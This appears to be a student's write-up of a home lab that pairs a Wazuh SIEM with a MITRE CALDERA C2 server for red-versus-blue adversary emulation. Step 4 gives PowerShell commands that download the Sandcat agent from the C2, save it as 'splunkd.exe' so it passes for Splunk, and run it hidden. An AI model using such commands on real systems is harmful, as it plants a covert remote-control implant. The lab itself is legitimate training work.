Description

This project demonstrates real-world attack and defense scenarios by simulating red team operations using MITRE CALDERA and monitoring detection capabilities with Wazuh SIEM. The lab environment consists of three virtual machines on an isolated network, allowing for safe adversary emulation and threat detection analysis.

Step 1: Wazuh SIEM Installation

Create Project Folder (Optional)

Create Ubuntu Server VM

Create Ubuntu Server VM in VMware with 4GB RAM, 2 CPUs, 40GB disk

Install Ubuntu Server

Press enter until you see this screen. Important: Uncheck "Set up disk as LVM"

Hit continue:

Set Username and Enable SSH

Set the following username and password for organization, and check "Install OpenSSH":

SSH into Wazuh VM

For time sake, switch to PowerShell. Get the VM's IP from command line, then SSH:

ssh wazuh@[VM's IP]

Install Wazuh

Run these commands (wait 5-10 minutes):

sudo apt update && sudo apt upgrade -y
curl -sO https://packages.wazuh.com/4.9/wazuh-install.sh
sudo bash ./wazuh-install.sh -a

Configure Network on VMnet1

Shutdown the VM:

sudo shutdown -h now

In VMware: Right-click VM → Settings → Network Adapter → Custom: VMnet1

Set Static IP

Power on the VM and enter:

sudo nano /etc/netplan/50-cloud-init.yaml

Input the following (use 4 spaces, NOT tabs):

network:
  version: 2
  ethernets:
    ens33:
      dhcp4: false
      addresses:
        - 192.168.232.10/24
      routes:
        - to: default
          via: 192.168.232.2
      nameservers:
        addresses:
          - 8.8.8.8
          - 8.8.4.4

Save (Ctrl+O), Exit (Ctrl+X), then apply:

sudo netplan apply

Reset Wazuh Password

Before accessing the dashboard, reset the admin password:

Access Wazuh Dashboard

Navigate to: https://192.168.232.10

Step 2: CALDERA C2 Server Installation

Create CALDERA VM

Create second Ubuntu Server VM (same installation as Wazuh) with 4GB RAM, 2 CPUs, 20GB disk

Set the following configuration:

Install Dependencies

Run the following commands in order:

# Update and install Python, pip, git
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-pip git

# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
sudo apt install -y nodejs

# Install Go
wget https://go.dev/dl/go1.24.0.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.24.0.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
source ~/.bashrc

Clone CALDERA Repository

cd ~
git clone https://github.com/mitre/caldera.git --recursive
cd caldera

Install Python Requirements

pip3 install -r requirements.txt --break-system-packages

Start CALDERA

Important: First run use --build flag. All other times, --build is not necessary.

python3 server.py --insecure --build

Configure Network on VMnet1

After building CALDERA, set the network to VMnet1:

Edit netplan configuration:

sudo nano /etc/netplan/50-cloud-init.yaml

Paste the following (Ctrl+O to save, Ctrl+X to exit):

network:
  version: 2
  ethernets:
    ens33:
      dhcp4: false
      addresses:
        - 192.168.232.33/24
      routes:
        - to: default
          via: 192.168.232.2
      nameservers:
        addresses:
          - 8.8.8.8
          - 8.8.4.4

Apply the configuration:

sudo netplan apply

Access CALDERA

Navigate to: http://192.168.232.33:8888

Username: admin
Password: admin

Step 4: Deploy CALDERA Sandcat Agent

Navigate to Agent Deployment

In CALDERA, navigate to Agents → Deploy an agent:

Deploy Sandcat for Windows

Select Sandcat for Windows and run the following PowerShell commands as Administrator:

Get-Process splunkd -ErrorAction SilentlyContinue | Stop-Process -Force

Remove-Item "C:\Users\Public\splunkd.exe" -Force -ErrorAction SilentlyContinue

Invoke-WebRequest -Uri "http://192.168.232.33:8888/file/download" -Headers @{"platform"="windows";"file"="sandcat.go"} -OutFile "C:\Users\Public\splunkd.exe"

Start-Process -FilePath "C:\Users\Public\splunkd.exe" -ArgumentList "-server http://192.168.232.33:8888 -group red" -WindowStyle hidden

Conclusion

This project provided invaluable hands-on experience in both offensive and defensive cybersecurity operations. Building this lab from the ground up significantly enhanced my Linux administration skills, from configuring network interfaces with netplan to managing services and troubleshooting connectivity issues across multiple Ubuntu servers. The command-line proficiency I gained through SSH sessions, package management, and system configuration will be foundational for my career in cybersecurity.

Working with Wazuh SIEM gave me practical experience with enterprise security monitoring tools. I learned how to deploy and configure a Security Information and Event Management system, interpret security alerts, correlate events across multiple sources, and map detections to the MITRE ATT&CK framework. Understanding how to navigate dashboards, create custom queries, and analyze security events in real-time provided insight into the day-to-day responsibilities of a Security Operations Center (SOC) analyst.

The red team aspect of this project, using MITRE CALDERA for adversary emulation, taught me how attackers think and operate. Executing various attack operations across credential access, privilege escalation, lateral movement, and persistence tactics helped me understand the offensive mindset necessary to build effective defenses. Observing how different attack techniques behave in a controlled environment provided perspective that theoretical learning alone cannot offer.

One of the most valuable learning experiences came from analyzing failed adversary events in CALDERA. When certain abilities failed to execute due to insufficient permissions, missing dependencies, or security controls blocking them, I gained critical insights into basic security principles. These failures demonstrated how privilege separation, least privilege access, and defensive configurations actually prevent attacks in practice. Understanding why attacks fail is just as important as understanding why they succeed—it reveals the importance of proper system hardening and security fundamentals.

Analyzing attacks in progress through both the CALDERA operation console and Wazuh dashboard simultaneously provided a unique dual perspective. Watching attack commands execute on the red team side while observing corresponding alerts appear on the blue team side reinforced the relationship between offensive actions and defensive detection. This correlation between attack and defense is the foundation of effective security operations.

This lab demonstrated that cybersecurity is not just about using tools, but about understanding systems, thinking critically about security gaps, and continuously testing and improving defenses. The hands-on experience gained through building, attacking, and defending this environment has prepared me for real-world security roles and instilled a mindset of continuous learning and improvement that will serve me throughout my cybersecurity career.
